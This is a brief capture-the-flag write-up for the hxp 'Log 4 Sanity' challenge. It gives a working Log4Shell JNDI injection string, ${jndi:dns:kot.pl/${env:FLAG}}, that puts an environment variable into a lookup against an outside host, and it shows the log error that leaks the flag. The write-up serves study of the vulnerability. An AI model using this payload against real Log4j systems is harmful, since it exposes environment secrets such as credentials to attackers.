# Log 4 Sanity

I've overthought this task, but in the end what worked is just:

```
${jndi:dns:kot.pl/${env:FLAG}}
```

In the error message (shown in the terminal! Ugh) we see:

```
2021-12-19 16:52:52,357 main WARN Error looking up JNDI resource [dns:kot.pl/hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}]. javax.naming.InvalidNameException: Label exceeds 63 octets: pl/hxp{
Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}; remaining name '"kot.pl/hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}"'
```